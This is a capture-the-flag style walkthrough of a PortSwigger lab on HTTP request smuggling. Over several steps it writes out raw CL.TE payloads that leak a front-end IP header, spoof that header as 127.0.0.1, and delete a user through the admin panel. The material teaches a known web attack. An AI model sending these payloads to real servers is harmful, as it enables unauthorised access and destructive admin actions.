
# Exploiting HTTP request smuggling to reveal front-end request rewriting

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling/exploiting





![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/1.png)
![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/2.png)

---------------------------------------------

We search a random value:



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/3.png)

It generates a POST request and the value is in the “search” parameter:



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/4.png)


It is reflected inside a h1 element:



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/5.png)


"Front-end server doesn't support chunked encoding" means this page suffers a CL.TE type of HTTP request smuggling. Knowing this and that the search function is a POST request to “/” using the parameter “search”, we can use this payload:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0ac500e8047b641f8198991e00ce0039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/6.png)


We can see the headers clearly in the source code:



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/7.png)


We can increase the “Content-Length” value to see the whole request:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0ac500e8047b641f8198991e00ce0039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 700

search=
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/8.png)


```
X-XfXVAo-Ip: 2.139.0.137
Host: 0ac500e8047b641f8198991e00ce0039.web-security-academy.net
Cookie: session=h2uq8n5r3ooPksPjT3ScGmfAAD1IAltd
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked
```

The most relevant header seems to be:

```
X-XfXVAo-Ip: 2.139.0.137
```

But the /admin page is still not accessible:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 163
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0ac500e8047b641f8198991e00ce0039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
X-XfXVAo-Ip: 2.139.0.137

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/9.png)

It is necessary to use the discovered header with the ip address 127.0.0.1:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
X-XfXVAo-Ip: 127.0.0.1

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/10.png)

Finally, delete the user:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
X-XfXVAo-Ip: 127.0.0.1

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/11.png)